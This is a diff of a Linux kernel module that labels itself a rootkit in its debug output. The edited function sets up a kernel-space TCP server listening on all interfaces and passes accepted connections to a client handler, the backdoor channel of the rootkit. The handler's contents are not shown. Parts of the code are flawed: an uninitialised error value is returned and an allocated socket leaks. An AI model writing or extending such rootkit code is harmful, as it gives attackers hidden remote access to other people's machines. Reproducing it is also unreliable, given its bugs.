@@ -10,7 +10,6 @@
 #include <linux/socket.h>
 #include <net/sock.h>
 
-#define BUFFER_SIZE 2048
 
 struct client_t{ //structure holding client information
 	struct socket *sock; //structure holding socket object
@@ -31,7 +30,7 @@ struct client_t client; //global variable holding  data associated with client f
 /*========================*\
 	networking functions
 \*========================*/
-static int run_server(int port){ //creates the server
+static int run_server(void *port){ //creates the server
 	struct server_t server; //holds data associated with server
 	int err; //int to hold error codes
 
@@ -42,27 +41,29 @@ static int run_server(int port){ //creates the server
 		return err; //returns -1 for error
 	}
 
-	memset(&(server.s_addr), 0, sizeof(server.s_addr)); //zeroes out the sin_addr
+	server.port = (int) port; //sets the server port
 
-	server.port = port; //sets port of server
+	memset(&(server.s_addr), 0, sizeof(server.s_addr)); //zeroes out the sin_addr
 
 	server.s_addr.sin_family = AF_INET; //sets the family
 	server.s_addr.sin_port = htons(server.port); //sets the port
-	server.s_addr.sin_addr.s_addr = INADDR_ANY; //sets the adress to any
+	server.s_addr.sin_addr.s_addr = in_aton("0.0.0.0"); //sets the adress to any
 	server.sock = (struct socket *)kmalloc(sizeof(struct socket), GFP_KERNEL); //allocates memory to the socket for server
+	if (server.sock == NULL) { //if message is null
+		printk(KERN_DEBUG "[rootkit] run_server- server.sock kmalloc error!\n"); //prints debug info
+		return err; //returns -1 for error
+	}
 	client.sock = (struct socket *)kmalloc(sizeof(struct socket), GFP_KERNEL); //allocates memory to the socket for connection
+	if (client.sock == NULL) { //if message is null
+		printk(KERN_DEBUG "[rootkit] run_server- client.sock kmalloc error!\n"); //prints debug info
+		return err; //returns -1 for error
+	}
 
 	err = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &(server.sock)); //creates socket for server
 	if (err < 0) { //if error creating socket
 		printk(KERN_DEBUG "[rootkit] net_connect- server socket creation error!- %i\n", err); //print debug info
 		return -1; //returns -1 for error
 	}
-	err = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &(client.sock)); //creates socket for connection
-	if (err < 0) { //if error creating socket
-		printk(KERN_DEBUG "[rootkit] net_connect- client socket creation error!- %i\n", err); //print debug info
-		return -1; //returns -1 for error
-	}
-
 	err = server.sock->ops->bind(server.sock, (struct sockaddr *)&(server.s_addr), sizeof(server.s_addr)); //binds server
 	if (err<0){ //if error binding
 		printk(KERN_DEBUG "[rootkit] run_server- server bind error!- %i\n", err); //prints debug info
@@ -81,7 +82,7 @@ static int run_server(int port){ //creates the server
 			printk(KERN_DEBUG "[rootkit] run_server- server accept error!- %i\n", err); //prints debug info
 			return err; //returns -1 for error
 		}
-		err = client.client_handler();
+		err = client_handler();
 		if (err<0){ //if error with handling
 			printk(KERN_DEBUG "[rootkit] run_server- client handle error!- %i\n", err); //prints debug info
 			return err; //returns -1 for error
